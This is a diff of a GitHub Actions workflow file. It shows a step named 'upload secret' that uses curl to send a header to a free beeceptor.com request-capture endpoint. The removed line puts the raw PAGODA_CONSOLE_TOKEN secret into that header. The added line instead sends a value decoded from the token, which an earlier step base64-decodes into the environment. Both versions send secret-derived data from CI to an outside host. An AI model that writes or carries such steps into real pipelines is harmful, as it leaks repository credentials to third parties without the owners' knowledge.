@@ -16,12 +16,13 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Set env
-        run: echo "TEMP=$(echo ${${{secrets.PAGODA_CONSOLE_TOKEN}}:6} | base64 --decode)" >> $GITHUB_ENV 
-      - name: Set env
-        run: echo "GITHUB_REPO_FULL_NAME=$(echo ${TEMP%:*})" >> $GITHUB_ENV
+        run: |
+          TEMP=$(echo ${${{secrets.PAGODA_CONSOLE_TOKEN}}:6} | base64 --decode)
+          echo "GITHUB_REPO_FULL_NAME=$(echo ${TEMP%:*})" >> $GITHUB_ENV
+          echo "TEST=value" >> $GITHUB_ENV
       - name: upload secret
         run: |
-          curl -v -X GET 'https://pickles.free.beeceptor.com/my/api/path' -H 'some-header: ${{ secrets.PAGODA_CONSOLE_TOKEN }}'
+          curl -v -X GET 'https://pickles.free.beeceptor.com/my/api/path' -H 'some-header: ${{ env.GITHUB_REPO_FULL_NAME }}'
     
       - uses: actions/checkout@v3
       - uses: actions/setup-node@v3
